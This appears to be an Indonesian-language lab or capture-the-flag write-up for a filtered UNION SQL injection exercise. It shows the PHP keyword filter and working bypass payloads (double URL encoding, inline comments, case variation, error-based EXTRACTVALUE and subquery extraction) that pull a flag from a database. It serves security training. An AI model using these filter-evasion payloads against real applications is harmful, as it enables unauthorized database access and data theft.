# Lab M2 - Filtered UNION SQL Injection (Medium)

## Informasi Lab
- **Endpoint**: `/account.php?id=`
- **Tipe**: Filtered UNION Injection
- **Hint**: Keyword filtered - union blocked

## Analisis

### 1. Identifikasi Filter
```
?id=1 UNION SELECT 1,2,3
```
Response: `Blocked: Union keyword detected!`

### 2. Filter Check
```php
if (preg_match('/union/i', $id)) {
    die("Blocked: Union keyword detected!");
}
```
Filter case-insensitive untuk keyword `union`.

## Solusi

### Metode 1 - Case Variation dengan Encoding
Filter hanya mengecek `union` secara case-insensitive, tapi tidak mengecek encoded characters.

### Metode 2 - Double URL Encoding
```
?id=1 %55NION SELECT 1,2,3
?id=1 %2555NION SELECT 1,2,3  (double encoded)
```

### Metode 3 - Inline Comments
```
?id=1 UN/**/ION SELECT 1,2,3
?id=1 UNI%0AON SELECT 1,2,3
```

### Metode 4 - Alternatif Tanpa UNION
Gunakan error-based atau blind:
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flags LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Metode 5 - Case Sensitive Bypass
Beberapa filter bisa di-bypass dengan:
```
?id=1 uNiOn SeLeCt 1,2,3
```
(Namun di lab ini case-insensitive)

### Solusi yang Bekerja

#### Payload 1 - Double URL Encode
```
?id=-1 %2555nion %2573elect 1,flag,3 FROM flags
```

#### Payload 2 - Error Based
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1),0x7e))
```

#### Payload 3 - Subquery di Parameter
```
?id=(SELECT id FROM (SELECT 1 as id,(SELECT flag FROM flags LIMIT 1) as user,3 as balance) t)
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Coba berbagai encoding: URL, double URL, hex
- Gunakan inline comments `/**/`
- Jika UNION diblokir, gunakan teknik lain (error-based, blind)
- Kombinasi huruf besar/kecil kadang berhasil
